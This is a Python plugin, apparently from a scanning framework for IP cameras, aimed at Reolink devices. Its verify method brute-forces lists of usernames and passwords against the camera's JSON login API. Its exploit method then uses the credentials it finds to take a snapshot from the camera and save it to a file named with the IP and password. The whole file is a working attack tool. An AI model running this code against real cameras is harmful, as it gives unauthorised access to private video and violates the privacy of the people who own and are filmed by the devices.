import requests
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate


class ReolinkWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['reolink']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """Reolink cameras may ship with default credentials (admin/blank)"""

    def verify(self, ip, port=80):
        headers = self._get_headers()
        proxies = self._get_proxies()
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    # Reolink uses a JSON API for login
                    login_payload = [{"cmd": "Login", "action": 0, "param": {
                        "User": {"userName": user, "password": password}
                    }}]
                    r = requests.post(
                        self._get_url(ip, port, '/cgi-bin/api.cgi?cmd=Login'),
                        json=login_payload,
                        headers=headers,
                        verify=False,
                        timeout=self.config.timeout,
                        proxies=proxies
                    )
                    if r.status_code == 200:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 0:
                            code = data[0].get('code', -1)
                            if code == 0:
                                return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        # Reolink snapshot endpoint
        url = self._get_url(ip, port, '/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=snap')
        return self._snapshot(url, img_file_name, auth=(user, password))


POCTemplate.register_poc(ReolinkWeakPassword)
